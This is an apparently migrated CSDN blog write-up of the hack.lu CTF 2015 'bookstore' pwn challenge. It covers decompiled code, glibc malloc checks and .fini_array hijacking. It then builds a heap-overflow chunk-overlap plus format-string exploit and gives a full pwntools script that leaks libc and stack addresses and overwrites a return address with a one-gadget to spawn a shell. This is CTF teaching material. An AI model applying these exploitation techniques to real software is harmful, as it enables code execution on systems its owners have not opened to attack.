---
layout: "single"
title: "CTF-PWN-Heap-[chunk extend/overlapping-2] (hack.lu ctf 2015 bookstore)"
date: "2024-02-07 18:32:35 +0800"
categories:
  - "CTF and Pwn"
tags:
  - "CTF-PWN"
  - "Pwn"
  - "CTF"
series: "CTF Writeup"
excerpt: "Before any menu option is selected, three heaps of size 0x80 have already been created (chunk size 0x90). The first chunk holds the content of order1, the second holds the content of order2, and the third holds the content of dest (which stores the string). Then the corresponding feature function runs based on the input. The function for option 5 creates a heap of 0x140 (chunk size 0x150), then combines the contents of the two previously defined orders and adds the string 'Your order is submitted!'. A format string vulnerability is found, but it is outside the loop, so the function only executes after submit."
source: "CSDN"
original_url: "https://blog.csdn.net/llovewuzhengzi/article/details/136072520"
csdn_article_id: "136072520"
migrated: true
permalink: /posts/csdn-136072520/
redirect_from:
  - "/en/CTF与Pwn/csdn-136072520/"
  - "/CTF与Pwn/csdn-136072520/"
---

{% raw %}
[Laid-back getshell](https://0x3f97.github.io/pwn/2018/01/31/hack.luctf2015-bookstore/)
[Regular getshell](https://bbs.kanxue.com/thread-246783.htm#msg_header_h2_2)
# hack.lu ctf 2015 bookstore
# Checks
The GOT table is writable, and there is no address randomization (PIE)
![Image](/images/csdn/2024/csdn-136072520/image-001-23198cbd04.png)
# IDA Source Code

> The C library function char *gets(char *str) reads a line from standard input stdin and stores it into the string pointed to by str. It stops when a newline character is read or when end-of-file is reached, depending on the situation.

 
> The C library function int puts(const char *str) writes a string to standard output stdout, up to but not including the null character. A newline character is appended to the output.

### main function

```c
signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v4; // [rsp+4h] [rbp-BCh]
  char *v5; // [rsp+8h] [rbp-B8h]
  char *first_order; // [rsp+18h] [rbp-A8h]
  char *second_order; // [rsp+20h] [rbp-A0h]
  char *dest; // [rsp+28h] [rbp-98h]
  char s[136]; // [rsp+30h] [rbp-90h] BYREF
  unsigned __int64 v10; // [rsp+B8h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  first_order = (char *)malloc(0x80uLL);
  second_order = (char *)malloc(0x80uLL);
  dest = (char *)malloc(0x80uLL);
  if ( !first_order || !second_order || !dest )
  {
    fwrite("Something failed!\n", 1uLL, 0x12uLL, stderr);
    return 1LL;
  }
  v4 = 0;
  puts(
    " _____          _   _                 _          _                   _ \n"
    "/__   \\_____  _| |_| |__   ___   ___ | | __  ___| |_ ___  _ __ ___  / \\\n"
    "  / /\\/ _ \\ \\/ / __| '_ \\ / _ \\ / _ \\| |/ / / __| __/ _ \\| '__/ _ \\/  /\n"
    " / / |  __/>  <| |_| |_) | (_) | (_) |   <  \\__ \\ || (_) | | |  __/\\_/ \n"
    " \\/   \\___/_/\\_\\\\__|_.__/ \\___/ \\___/|_|\\_\\ |___/\\__\\___/|_|  \\___\\/   \n"
    "Crappiest and most expensive books for your college education!\n"
    "\n"
    "We can order books for you in case they're not in stock.\n"
    "Max. two orders allowed!\n");
LABEL_14:
  while ( !v4 )
  {
    puts("1: Edit order 1");
    puts("2: Edit order 2");
    puts("3: Delete order 1");
    puts("4: Delete order 2");
    puts("5: Submit");
    fgets(s, 128, stdin);
    switch ( s[0] )
    {
      case '1':
        puts("Enter first order:");
        edit_order(first_order);
        strcpy(dest, "Your order is submitted!\n");
        goto LABEL_14;
      case '2':
        puts("Enter second order:");
        edit_order(second_order);
        strcpy(dest, "Your order is submitted!\n");
        goto LABEL_14;
      case '3':
        delete_order(first_order);
        goto LABEL_14;
      case '4':
        delete_order(second_order);
        goto LABEL_14;
      case '5':
        v5 = (char *)malloc(0x140uLL);
        if ( !v5 )
        {
          fwrite("Something failed!\n", 1uLL, 0x12uLL, stderr);
          return 1LL;
        }
        submit(v5, first_order, second_order);
        v4 = 1;
        break;
      default:
        goto LABEL_14;
    }
  }
  printf("%s", v5);
  printf(dest);
  return 0LL;
  
}
```
Before any menu option is selected, three heaps of size 0x80 have already been created (chunk size 0x90). The first chunk holds the content of order1, the second holds the content of order2, and the third holds the content of dest (which stores the string). Then the corresponding feature function runs based on the input. The function for option 5 creates a heap of 0x140 (chunk size 0x150), then combines the contents of the two previously defined orders plus a string "Your order is submitted!\n"
### edit_note

```c
unsigned __int64 __fastcall edit_order(char *a1)
{
  int idx; // eax
  int v3; // [rsp+10h] [rbp-10h]
  int cnt; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v3 = 0;
  cnt = 0;
  while ( v3 != '\n' )
  {
    v3 = fgetc(stdin);
    idx = cnt++;
    a1[idx] = v3;
  }
  a1[cnt - 1] = 0;
  return __readfsqword(0x28u) ^ v5;
}
```
There is no limit on the input length; you can keep inputting until a newline character, and the newline is replaced with 0
### delete_note

```python
unsigned __int64 __fastcall delete_order(void *a1)
{
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  free(a1);
  return __readfsqword(0x28u) ^ v2;
}
```
It frees directly without clearing the pointer, so there is a use-after-free
### submit

```python
unsigned __int64 __fastcall submit(char *all, const char *order1, char *order2)
{
  size_t v3; // rax
  size_t v4; // rax
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  strcpy(all, "Order 1: ");
  v3 = strlen(order1);
  strncat(all, order1, v3);
  strcat(all, "\nOrder 2: ");
  v4 = strlen(order2);
  strncat(all, order2, v4);
  *(_WORD *)&all[strlen(all)] = '\n';
  return __readfsqword(0x28u) ^ v7;
}
```
Submission: at this point, the strings of each order are combined with the string content that was already assigned to dest when feature 1 or 2 was used, and then assigned to dest again


##  .fini_array section hijacking (a way to return to the main function)
[Reference material on .fini_array section hijacking](https://nocbtm.github.io/2020/02/20/%C2%96-fini-array%E6%AE%B5%E5%8A%AB%E6%8C%81/)

> Most executables are compiled by linking against libc, so gcc places glibc initialization code into the compiled executables and shared libraries. The .init_array and .fini_array sections (called .ctors and .dtors in earlier versions) hold function pointers to initialization code and termination code. The .init_array function pointers are triggered before the main() function is called. This means that control flow can be directed to a virus or parasitic code by overwriting a pointer with the correct address. The .fini_array function pointers are triggered only after the main() function finishes executing, which can be very useful in certain scenarios. For example, a specific heap overflow vulnerability (such as the former Once upon a free()) may allow an attacker to write 4 bytes anywhere, and attackers typically use a function pointer pointing to the address of shellcode to overwrite the .fini_array function pointer. For most virus or malware authors, the .init_array function pointer is the most commonly attacked target, because it usually allows the parasitic code to run before the rest of the program executes.


Constructors and destructors. Programmers should specify these attributes in a way similar to the following:

Functions with the "constructor" attribute will be executed before the main() function, while functions declared with the "destructor" attribute will be executed after main() exits.



```c
#include <stdio.h>
#include <stdlib.h>

static void start(void) __attribute__ ((constructor));
static void stop(void) __attribute__ ((destructor));

int main(int argc, char *argv[])
{
    printf("start == %p\n", start);
    printf("stop == %p\n", stop);
    return 0;
}

void start(void)
{
    printf("hello world!\n");
}

void stop(void)
{
    printf("goodbye world!\n");
}
```
![Image](/images/csdn/2024/csdn-136072520/image-002-297ddf52b8.png)
In gdb, use readelf to view the corresponding .init_array and .fini_array sections, as well as the function pointers stored in them
![Image](/images/csdn/2024/csdn-136072520/image-003-6153dc4c55.png)
Let's analyze the results
The 0x1160 stored in .init_array is the address of the frame_dummy function (viewable in IDA); 0x11bf is the address of our self-defined start function. In other words, before main starts, the frame_dummy function and the start function will be executed first

The 0x1120 stored in .fini_array is the address of the __do_global_dtors_aux function (viewable in IDA); 0x11d9 is the address of our self-defined stop function. In other words, after main ends, the __do_global_dtors_aux function and the stop function will be executed


Suppose we now remove the defined attributes
```c
#include <stdio.h>
#include <stdlib.h>

static void start(void) ;
static void stop(void) ;

int main(int argc, char *argv[])
{
    printf("start == %p\n", start);
    printf("stop == %p\n", stop);
    return 0;
}

void start(void)
{
    printf("hello world!\n");
}

void stop(void)
{
    printf("goodbye world!\n");
}
```
At this point, both .init_array and .fini_array contain only one function pointer: .init_array holds the address of the frame_dummy function (viewable in IDA), and .fini_array holds the address of the __do_global_dtors_aux function (viewable in IDA) 
![Image](/images/csdn/2024/csdn-136072520/image-004-8e0430f45b.png)

# Approach
There is an obvious overflow with arbitrary length, so we can modify the headers and contents of other chunks
As shown, when using edit 2 we write 0x80 bytes to fill chunk2, and the extra content overflows onto the header of chunk3, thereby modifying it
![Image](/images/csdn/2024/csdn-136072520/image-005-10550ae001.png)
But first we need to obtain the libc address, which means we need to leak the address of a related function

A format string vulnerability is found, but it is outside the loop, so the function only executes after submit. Also, since editing copies a string into the dest location, when overflowing to set up the format string we must reserve space in advance for the string that will be copied in later. The format string comes after that. However, we then find that because strcpy also copies the null byte in, the content after it becomes invalid, so this method still does not work. We have to find another opportunity to overwrite dest again

At this point we need to use the chunk extend technique
First free the second heap, then overflow from editing the first heap to modify the header of the second heap, and then call submit to trigger malloc. Of course, we could also first overflow from the first heap to modify the header of the second heap, then free the second heap, and then call submit to trigger malloc
This way, the heap obtained by submit is the second heap, and its size extends over the dest chunk, so we can modify the format string

Before free, various checks are performed on the chunk. In short, double free is not allowed, and the next chunk computed from the size must indeed be a chunk obtained from malloc. When malloc'ing, forward and backward consolidation is attempted on the chunk in the unsorted bin: first, prev_inuse determines whether to consolidate backward — if it is 1, no consolidation is needed. Similarly, if the next chunk is in use, there is no forward consolidation (this checks the prev_inuse bit of the chunk after the next chunk)

So the overflowing prev_size being 0 does not matter here. If we free first, none of these pre-free checks need to be considered — we only need to figure out how to modify things so that malloc returns the 0x140 heap as the second chunk. But if we modify first and then free, the various checks we face are cumbersome and we would also need to craft the next chunk. So we adopt the approach of freeing first and then modifying, which corresponds to remalloc from the unsorted bin


```c
if (size == nb)
{
    set_inuse_bit_at_offset (victim, size);
    if (av != &main_arena)
        victim->size |= NON_MAIN_ARENA;
    check_malloced_chunk (av, victim, nb);
    void *p = chunk2mem (victim);
    alloc_perturb (p, bytes);
    return p;
```

```c
# define check_malloced_chunk(A, P, N)   do_check_malloced_chunk (A, P, N)
static void
do_check_malloced_chunk (mstate av, mchunkptr p, INTERNAL_SIZE_T s)
{
  /* same as recycled case ... */
  do_check_remalloced_chunk (av, p, s);

  /*
     ... plus,  must obey implementation invariant that prev_inuse is
     always true of any allocated chunk; i.e., that each allocated
     chunk borders either a previously allocated and still in-use
     chunk, or the base of its memory arena. This is ensured
     by making all allocations from the `lowest' part of any found
     chunk.  This does not necessarily hold however for chunks
     recycled via fastbins.
   */

  assert (prev_inuse (p));
}
static void
do_check_remalloced_chunk (mstate av, mchunkptr p, INTERNAL_SIZE_T s)
{
  INTERNAL_SIZE_T sz = p->size & ~(PREV_INUSE | NON_MAIN_ARENA);

  if (!chunk_is_mmapped (p))
    {
      assert (av == arena_for_chunk (p));
      if (chunk_non_main_arena (p))
        assert (av != &main_arena);
      else
        assert (av == &main_arena);
    }

  do_check_inuse_chunk (av, p);

  /* Legal size ... */
  assert ((sz & MALLOC_ALIGN_MASK) == 0);
  assert ((unsigned long) (sz) >= MINSIZE);
  /* ... and alignment */
  assert (aligned_OK (chunk2mem (p)));
  /* chunk is less than MINSIZE more than request */
  assert ((long) (sz) - (long) (s) >= 0);
  assert ((long) (sz) - (long) (s + MINSIZE) < 0);
}

/*
   Properties of nonrecycled chunks at the point they are malloced
 */



static void
do_check_inuse_chunk (mstate av, mchunkptr p)
{
  mchunkptr next;

  do_check_chunk (av, p);

  if (chunk_is_mmapped (p))
    return; /* mmapped chunks have no next/prev */

  /* Check whether it claims to be in use ... */
  assert (inuse (p));

  next = next_chunk (p);

  /* ... and is surrounded by OK chunks.
     Since more things can be checked with free chunks than inuse ones,
     if an inuse chunk borders them and debug is on, it's worth doing them.
   */
  if (!prev_inuse (p))
    {
      /* Note that we cannot even look at prev unless it is not inuse */
      mchunkptr prv = prev_chunk (p);
      assert (next_chunk (prv) == p);
      do_check_free_chunk (av, prv);
    }

  if (next == av->top)
    {
      assert (prev_inuse (next));
      assert (chunksize (next) >= MINSIZE);
    }
  else if (!inuse (next))
    do_check_free_chunk (av, next);                       这个检查应该使得无法利用的，不知道为啥可以利用成功
}
```
We can see that the inuse bit of the next chunk is 0
The next chunk should not be able to pass do_check_free_chunk (av, next);   
Not sure why
![Image](/images/csdn/2024/csdn-136072520/image-006-8f804494e9.png)
```c



static void
do_check_chunk (mstate av, mchunkptr p)
{
  unsigned long sz = chunksize (p);
  /* min and max possible addresses assuming contiguous allocation */
  char *max_address = (char *) (av->top) + chunksize (av->top);
  char *min_address = max_address - av->system_mem;

  if (!chunk_is_mmapped (p))
    {
      /* Has legal address ... */
      if (p != av->top)
        {
          if (contiguous (av))
            {
              assert (((char *) p) >= min_address);
              assert (((char *) p + sz) <= ((char *) (av->top)));
            }
        }
      else
        {
          /* top size is always at least MINSIZE */
          assert ((unsigned long) (sz) >= MINSIZE);
          /* top predecessor always marked inuse */
          assert (prev_inuse (p));
        }
    }
  else
    {
      /* address is outside main heap  */
      if (contiguous (av) && av->top != initial_top (av))
        {
          assert (((char *) p) < min_address || ((char *) p) >= max_address);
        }
      /* chunk is page-aligned */
      assert (((p->prev_size + sz) & (GLRO (dl_pagesize) - 1)) == 0);
      /* mem is aligned */
      assert (aligned_OK (chunk2mem (p)));
    }
}

static void
do_check_free_chunk (mstate av, mchunkptr p)
{
  INTERNAL_SIZE_T sz = p->size & ~(PREV_INUSE | NON_MAIN_ARENA);
  mchunkptr next = chunk_at_offset (p, sz);

  do_check_chunk (av, p);

  /* Chunk must claim to be free ... */
  assert (!inuse (p));
  assert (!chunk_is_mmapped (p));

  /* Unless a special marker, must have OK fields */
  if ((unsigned long) (sz) >= MINSIZE)
    {
      assert ((sz & MALLOC_ALIGN_MASK) == 0);
      assert (aligned_OK (chunk2mem (p)));
      /* ... matching footer field */
      assert (next->prev_size == sz);
      /* ... and is fully consolidated */
      assert (prev_inuse (p));
      assert (next == av->top || inuse (next));

      /* ... and has minimally sane links */
      assert (p->fd->bk == p);
      assert (p->bk->fd == p);
    }
  else /* markers are always of size SIZE_SZ */
    assert (sz == SIZE_SZ);
}
```


## What is the format string here?

Here we exploit the fact that fgetc can input null characters and that string-related functions terminate at null characters, so that the content we ultimately input lands exactly at the position of the format string argument

The corresponding submit result at this point: Order 1: content\nOrder 2: Order 1: content\nOrder 2: \n
Our goal is to make the second content land at the dest position

First, to overflow to the position where we can modify the header of node 2, the characters must fill 0x80 bytes. And to ensure the second content lands at the dest position, the preceding content (Order 1: content\nOrder 2: Order 1: ) must be 0x90 bytes. Since the content is exactly 0x90 bytes (0x80 + 0x10 chunk header), and string functions terminate at null characters, we can place null characters in the content to cut it off

> After the program exits, the function at the `.fini_array` address will be executed, but it can only be exploited once.


> Here we take advantage of the fact that the chunk obtained by malloc(0x150) is still order2. In submit, the first copy copies order1 into order2, and then the content of order2 is copied into order2 again, so the part beyond 0x80 becomes the content of the format string


The format string at this point is used to leak the address of the libc_start_main function on the stack, modify the content of fini_array, and leak a stack address that has a fixed offset from the second invocation of the printf format string vulnerability
![Image](/images/csdn/2024/csdn-136072520/image-007-6121d20240.png)

After constructing the format string, append the address of fini_array after entering menu option 5, then find the offset between the input position and the printf arguments, and finally modify the address and leak the addresses

Finally, during the second format string attack, modify the return address to the address of the onegadget (the method is similar to the first time; the position of the return address on the stack has a fixed offset from the previously leaked stack address)

After replacing the return address with the onegadget address, when execution reaches the onegadget you will find that rax is already NULL, so there is no need to zero it out
![Image](/images/csdn/2024/csdn-136072520/image-008-c1d3b6b40d.png)

##  Converting hexadecimal strings or bytes (with or without the 0x prefix) to integers

```python
int(字符串，16)
```
## Other ways to construct the format string
You can concatenate with multiple + signs

```python
b"%"+one+b"c%13$hhn"+b"%"+two+b"c%14$hn"
```
# exp

```python
from pwn import*
context(os="linux",arch="amd64",log_level="debug")
p=process("./books")
#gdb.attach(p,"b main")
f=ELF("./books")
free_got=f.got["free"]

def editor1(content):
    p.sendlineafter(b"5: Submit\n",str(1))
    p.sendlineafter(b"Enter first order:\n",content)

def editor2(content):
    p.sendlineafter(b"5: Submit\n",str(2))
    p.sendlineafter(b"Enter second order:\n",content)

def delete1():
    p.sendlineafter(b"5: Submit\n",str(3))

def delete2():
    p.sendlineafter(b"5: Submit\n",str(4))

def submit(content):
    p.sendlineafter(b"5: Submit\n",content)


delete2()
payload=b"%10c%13$hhn%47c%14$hhn" #修改fini的内容
payload=payload+b"function:%31$p stack:%33$p"    # 泄露栈顶地址和函数地址

# p 0x7ffdb2339578-0x7ffdb23393c8 $1 = 0x1b0
#p 0x7ffdb23393c8- 0x7ffdb23392b8 $5 = 0x110



payload=payload+b'a'*(0x90-28-len(payload))
payload=payload+b"\x00"*(0x80-len(payload))+p64(0)+p64(0x151)
# Order 1: 内容\nOrder 2: Order 1: 内容\nOrder 2: \n
editor1(payload)

fini_addr=0x6011b8
submit(b'5'+7*p8(0x0)+p64(fini_addr+1)+p64(fini_addr))
#0x7fffe0688210-0x7fffe06881e0  0x0000000000400830  0x400a39


p.recvuntil(b"stack")
p.recvuntil(b"stack")
p.recvuntil(b"function:")
libc_start_main=p.recvuntil(b" ")[:-1]
libc_start_main=int(libc_start_main,16) # 将0x形式的字符串转化数字

p.recvuntil(b"stack:")
stack_addr=p.recvuntil(b"a")[:-1]
stack_addr=int(stack_addr,16)


libc_start_main=libc_start_main-240
libc_addr=libc_start_main-0x20750
stack_addr=stack_addr-0x1b0-0x110 +208
onegadget_addr=libc_addr+0x45226

print("libc_start_main",hex(libc_start_main))
print("libc_addr",hex(libc_addr))
print("stack_addr",hex(stack_addr)) 

change46=hex(onegadget_addr)[-6:-4]
change46=int(change46,16)
print(hex(change46))
change14=hex(onegadget_addr)[-4:]
change14=int(change14,16)
print(hex(change14))
two=bytes(str(change14-change46),"ascii")
one=bytes(str(change46),"ascii")


delete2()
print(one)
print(two)
payload=b"%"+one+b"c%13$hhn"+b"%"+two+b"c%14$hn"

payload=payload+b'a'*(0x90-28-len(payload))
payload=payload+b"\x00"*(0x80-len(payload))+p64(0)+p64(0x151)
# Order 1: 内容\nOrder 2: Order 1: 内容\nOrder 2: \n
editor1(payload)


submit(b'5'+7*p8(0x0)+p64(stack_addr+2)+p64(stack_addr))

p.interactive()
```
{% endraw %}
